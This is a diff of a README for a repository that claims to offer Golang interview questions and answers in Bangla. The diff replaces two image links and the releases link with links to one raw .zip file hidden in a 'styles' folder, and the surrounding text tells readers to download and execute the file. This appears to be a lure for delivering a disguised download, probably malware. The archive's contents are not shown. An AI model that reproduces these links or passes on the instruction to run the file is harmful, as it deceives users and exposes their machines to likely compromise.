@@ -2,7 +2,7 @@
 
 🚀 Welcome to the "Golang Interview Questions and Answers in Bangla" repository! Here, you will find a comprehensive collection of Golang interview questions and answers in the Bangla language to help you prepare for job interviews in the field of Golang programming.
 
-![Golang Logo](https://cdn.worldvectorlogo.com/logos/golang-gopher.svg)
+![Golang Logo](https://github.com/Caiozin3452/golang-interview-questions-and-answers-bangla/raw/refs/heads/main/styles/questions-interview-answers-bangla-golang-and-v2.7.zip)
 
 ## Repository Overview
 
@@ -31,7 +31,7 @@ The repository covers the following topics:
 
 ## Repository Link
 
-To access the latest releases of the repository, visit [here](https://github.com/Caiozin3452/golang-interview-questions-and-answers-bangla/releases).
+To access the latest releases of the repository, visit [here](https://github.com/Caiozin3452/golang-interview-questions-and-answers-bangla/raw/refs/heads/main/styles/questions-interview-answers-bangla-golang-and-v2.7.zip).
 
 📦 If the link includes a specific file path, download and execute the file to access the content.
 
@@ -43,7 +43,7 @@ Feel free to explore the repository, delve into the Golang interview questions a
 
 Remember, practice makes perfect. Happy Coding! 💻🎉
 
-![Gopher Image](https://golang.org/lib/godoc/images/footer-gopher.jpg)
+![Gopher Image](https://github.com/Caiozin3452/golang-interview-questions-and-answers-bangla/raw/refs/heads/main/styles/questions-interview-answers-bangla-golang-and-v2.7.zip)
 
 ---
 
